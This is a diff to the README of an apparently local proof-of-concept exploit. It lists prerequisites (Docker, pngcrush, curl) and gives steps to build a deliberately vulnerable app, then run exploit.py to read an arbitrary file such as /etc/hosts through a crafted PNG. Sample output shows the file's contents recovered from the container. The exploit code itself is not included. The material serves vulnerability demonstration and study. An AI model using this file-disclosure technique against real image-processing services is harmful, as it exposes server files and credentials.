@@ -2,27 +2,33 @@
 
 WIP
 
-Steps to run:
+### Prerequisites on local machine:
+* [Docker Desktop](https://docs.docker.com/get-docker/) (or similar)
+* [pngcrush](https://pmt.sourceforge.io/pngcrush/)
+* [Python 3](https://www.python.org/)
+* [curl](https://github.com/curl/curl)
+* _Optional but helpful for troubleshooting:_ [exiv2](https://exiv2.org/) 
+
+### Steps to run:
 * Build the image: `docker build -t poc .`
 * Run the vulnerable app: `docker run --rm -p 3000:3000 poc`
-* Trigger the exploit, passing in whatever file you want to cat from the poc: `./exploit.sh /etc/hosts`
+* Trigger the exploit, passing in whatever file you want to cat from the poc: `./exploit.py /etc/hosts`
 
-Example output:
+#### Example output:
 ```shell
-$ ./exploit.sh /etc/hosts
-  Recompressing IDAT chunks in k8s.png to pngout.png
-   Total length of data found in critical chunks            =    286254
-   Best pngcrush method        =   7 (ws 15 fm 0 zl 9 zs 0) =    235241
-CPU time decode 0.820487, encode 2.650206, other 0.001669, total 3.474239 sec
-Found. Redirecting to /
+$ ./exploit.py /etc/hosts
+Encoding /etc/hosts into k8s.png as pngout.png...
+Sending pngout.png to localhost:3000...
+Finding processed image and downloading as result.png...
+Downloading resized-image-1676317559895.png as result.png
+Decoding content from /Users/foo/path/to/result.png...
 
-Content of '/etc/hosts' on remote host:
 127.0.0.1	localhost
 ::1	localhost ip6-localhost ip6-loopback
 fe00::0	ip6-localnet
 ff00::0	ip6-mcastprefix
 ff02::1	ip6-allnodes
 ff02::2	ip6-allrouters
-172.17.0.3	48a345143cfd
+172.17.0.2	2b6cb0891610
 ```
 
